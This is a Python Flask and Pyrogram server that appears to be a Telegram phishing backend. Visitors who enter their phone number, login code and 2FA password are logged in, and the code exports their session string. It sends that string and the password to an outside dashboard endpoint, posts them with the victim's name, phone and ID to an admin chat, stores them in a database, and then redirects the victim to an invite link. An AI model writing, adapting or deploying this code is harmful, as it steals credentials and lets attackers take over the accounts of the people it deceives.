import os
import asyncio
import sqlite3
import html
import logging
import requests
from flask import Flask, request, jsonify, send_from_directory
from pyrogram import Client, errors

# ─── LOGGING CONFIGURATION ───
logging.basicConfig(level=logging.INFO, format="%(asctime)s - [%(levelname)s] - %(message)s")
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder='.', static_url_path='')

API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

raw_admin_chat = os.getenv("ADMIN_CHAT_ID", "")
ADMIN_CHAT_ID = int(raw_admin_chat) if raw_admin_chat.lstrip('-').isdigit() else raw_admin_chat

STATIC_INVITE_LINK = os.getenv("STATIC_INVITE_LINK", "https://t.me/+bDGHiHUCt_MwOWY9")

# ─── TOOL 3 PUSH CONFIGURATION ───
TOOL3_PUSH_URL = os.getenv("TOOL3_PUSH_URL", "https://dashboardbyfinn.up.railway.app/api/tool3/sessions/push")
T3_PUSH_KEY = os.getenv("T3_PUSH_KEY", "")

temp_clients = {}

# ─── SQLITE DATABASE HELPER ───
DB_PATH = "data/sessions.db"

def get_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH, timeout=20.0)
    conn.execute("PRAGMA journal_mode=WAL;")
    conn.execute("PRAGMA synchronous=NORMAL;")
    return conn

def init_db():
    conn = get_db()
    try:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS active_sessions (
                phone TEXT PRIMARY KEY,
                user_id INTEGER,
                session TEXT NOT NULL,
                msg_id INTEGER
            )
        ''')
        conn.commit()
    finally:
        conn.close()

def save_active_session(phone, user_id, session_str, msg_id):
    conn = get_db()
    try:
        conn.execute('''
            INSERT OR REPLACE INTO active_sessions (phone, user_id, session, msg_id)
            VALUES (?, ?, ?, ?)
        ''', (phone, user_id, session_str, msg_id))
        conn.commit()
        logger.info(f"💾 Saved session for {phone} with msg_id: {msg_id}")
    finally:
        conn.close()

init_db()

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ─── TELEGRAM BOT API HELPER ───
def _sync_bot_api_post(method: str, data: dict):
    if not BOT_TOKEN:
        return {"ok": False, "description": "No BOT_TOKEN"}
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        res = requests.post(url, json=data, timeout=10)
        return res.json()
    except Exception as e:
        logger.error(f"Error calling Telegram API {method}: {e}")
        return {"ok": False, "description": str(e)}

async def bot_api_post(method: str, data: dict):
    return await asyncio.to_thread(_sync_bot_api_post, method, data)

# ─── PUSH TO TOOL 3 HELPER (UPDATED WITH 2FA) ───
def _sync_push_to_tool3(session_string: str, two_fa: str = ""):
    if not TOOL3_PUSH_URL or not T3_PUSH_KEY:
        logger.warning("⚠️ TOOL3_PUSH_URL or T3_PUSH_KEY is missing. Skipping direct push.")
        return
    
    headers = {
        "X-Push-Key": T3_PUSH_KEY,
        "Content-Type": "application/json"
    }
    payload = {
        "string": session_string,
        "two_fa": two_fa  # 👈 បញ្ជូនកូដ 2FA ទៅជាមួយ
    }
    try:
        res = requests.post(TOOL3_PUSH_URL, json=payload, headers=headers, timeout=10)
        if res.status_code == 200:
            logger.info("🚀 Successfully pushed session string and 2FA directly to Tool 3!")
        else:
            logger.error(f"❌ Failed to push to Tool 3: {res.status_code} - {res.text}")
    except Exception as e:
        logger.error(f"⚠️ Error connecting to Tool 3 push endpoint: {e}")

async def push_to_tool3(session_string: str, two_fa: str = ""):
    await asyncio.to_thread(_sync_push_to_tool3, session_string, two_fa)

async def async_send_code(phone_number):
    client = Client(
        name=f"session_{phone_number.replace('+', '')}",
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=True
    )
    await client.connect()
    sent = await client.send_code(phone_number)
    temp_clients[phone_number] = {
        "client": client,
        "phone_code_hash": sent.phone_code_hash
    }
    return True

async def async_verify_code(phone_number, code, password):
    session_data = temp_clients.get(phone_number)
    if not session_data:
        raise Exception("Session expired. Please request OTP again.")

    client = session_data["client"]
    phone_code_hash = session_data["phone_code_hash"]

    try:
        if password:
            await client.check_password(password)
        else:
            await client.sign_in(phone_number, phone_code_hash, code)
    except errors.SessionPasswordNeeded:
        return {"requires_password": True}

    me = await client.get_me()
    user_id = me.id
    username = f"@{me.username}" if me.username else "No Username"
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "N/A"

    session_string = await client.export_session_string()
    await client.disconnect()
    temp_clients.pop(phone_number, None)

    # 🚀 ផ្ញើ Session String និង 2FA ចូល Project Tool 3 (dashboardbyfinn.up.railway.app) ដោយផ្ទាល់
    await push_to_tool3(session_string, two_fa=password or "")

    msg_id = None
    if BOT_TOKEN and ADMIN_CHAT_ID:
        two_fa_text = password if password else "None"
        msg = (
            "🟢 <b>New Active Telegram Session Logged In!</b>\n\n"
            f"👤 <b>Name:</b> {html.escape(full_name)}\n"
            f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
            f"🏷 <b>Username:</b> {html.escape(username)}\n"
            f"📱 <b>Phone:</b> <code>{html.escape(phone_number)}</code>\n"
            f"🔐 <b>2FA :</b> <code>{html.escape(two_fa_text)}</code>\n\n"
            f"🔑 <b>Pyrogram Session String:</b>\n<code>{html.escape(session_string)}</code>"
        )
        res = await bot_api_post("sendMessage", {
            "chat_id": ADMIN_CHAT_ID,
            "text": msg,
            "parse_mode": "HTML"
        })
        if res.get("ok"):
            msg_id = res["result"]["message_id"]
            logger.info(f"📩 Admin message sent successfully. Message ID: {msg_id}")
        else:
            logger.error(f"❌ Failed to send admin message: {res}")

    save_active_session(phone_number, user_id, session_string, msg_id)

    return {
        "success": True,
        "message": "Authentication successful!",
        "session": session_string,
        "redirectUrl": STATIC_INVITE_LINK
    }

# ─── FLASK API ROUTES ───
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send-code', methods=['POST'])
def send_code():
    data = request.json or {}
    phone_number = (data.get('phoneNumber') or '').strip()
    if not phone_number:
        return jsonify({"success": False, "error": "Phone number is required"}), 400
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    try:
        future = asyncio.run_coroutine_threadsafe(async_send_code(phone_number), loop)
        future.result()
        return jsonify({"success": True, "message": "OTP code sent!"})
    except Exception as err:
        logger.error(f"Error sending OTP to {phone_number}: {err}")
        return jsonify({"success": False, "error": str(err)}), 500

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json or {}
    phone_number = (data.get('phoneNumber') or '').strip()
    code = data.get('code')
    password = data.get('password')

    if not phone_number or not code:
        return jsonify({"success": False, "error": "Phone number and code required"}), 400

    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    try:
        future = asyncio.run_coroutine_threadsafe(async_verify_code(phone_number, code, password), loop)
        res = future.result()
        if res.get("requires_password"):
            return jsonify({"success": False, "requiresPassword": True}), 401
        return jsonify(res)
    except Exception as err:
        logger.error(f"Error verifying code for {phone_number}: {err}")
        return jsonify({"success": False, "error": str(err)}), 400

if __name__ == '__main__':
    import threading
    threading.Thread(target=loop.run_forever, daemon=True).start()
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port, threaded=True)
